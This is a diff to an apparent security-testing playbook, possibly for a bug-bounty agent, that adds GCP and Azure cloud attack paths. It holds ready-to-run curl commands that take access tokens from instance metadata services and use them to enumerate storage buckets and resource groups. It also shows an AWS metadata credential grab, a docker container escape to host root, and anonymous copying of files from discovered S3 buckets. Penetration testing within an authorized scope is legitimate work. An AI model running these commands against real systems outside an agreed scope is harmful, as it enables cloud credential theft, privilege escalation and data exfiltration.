@@ -48,7 +48,57 @@ ls /var/run/secrets/ 2>/dev/null            # k8s service account token
 
 ---
 
-## Phase 2 — AWS Attack Path
+## Phase 2 — Cloud Provider Attack Paths
+
+### GCP IMDS (if GCP detected)
+```bash
+# GCP requires the Metadata-Flavor header — unauthenticated if missing check is absent
+curl -s -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+# Returns: access_token, token_type, expires_in
+
+# Enumerate scopes (what can this SA do?)
+curl -s -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
+
+# Get project ID
+curl -s -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/project/project-id"
+
+# With the token, enumerate GCS buckets
+ACCESS_TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
+curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+  "https://storage.googleapis.com/storage/v1/b?project=<PROJECT_ID>" | python3 -c "
+import sys, json
+d = json.load(sys.stdin)
+for b in d.get('items', []):
+    print(b['name'], b.get('location'))
+" 2>/dev/null | head -20
+```
+
+### Azure IMDS (if Azure detected)
+```bash
+# Azure IMDS requires api-version header
+TOKEN_RESP=$(curl -s -H "Metadata: true" \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/")
+ACCESS_TOKEN=$(echo "$TOKEN_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)
+[[ -n "$ACCESS_TOKEN" ]] && echo "Azure IMDS accessible, token obtained" || echo "No managed identity or IMDS blocked"
+
+# Get subscription ID
+curl -s -H "Metadata: true" \
+  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | \
+  python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('compute',{}).get('subscriptionId',''))" 2>/dev/null
+
+# Enumerate resource groups with the token
+SUBSCRIPTION_ID="<from above>"
+curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups?api-version=2021-04-01" | \
+  python3 -c "import sys,json; [print(r['name']) for r in json.load(sys.stdin).get('value',[])]" 2>/dev/null | head -20
+```
+
+### AWS Attack Path
 
 ### IMDSv1 (if detected — unauthenticated, critical)
 ```bash
@@ -208,9 +258,10 @@ docker run -v /:/host --rm -it alpine chroot /host sh 2>/dev/null
 
 ```bash
 # Enumerate S3 buckets by org name (no credentials needed)
+# NOTE: cloud_enum makes external DNS/HTTP queries — skip on isolated BountyBench targets; use for real H1 targets only
 cloud_enum -k TARGET-ORG-NAME 2>/dev/null | grep -E "OPEN|PRIVATE|bucket" | head -30
 
-# Test public bucket access
+# Test public bucket access (no external queries — safe for isolated targets)
 aws s3 ls s3://DISCOVERED-BUCKET --no-sign-request 2>/dev/null | head -20
 aws s3 cp s3://DISCOVERED-BUCKET/sensitive-file /tmp/ --no-sign-request 2>/dev/null
 ```
@@ -237,6 +288,7 @@ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
 - `aws iam simulate-principal-policy` → <list of allowed actions>
 
 **Confidence:** confirmed
+```
 
 ---
 
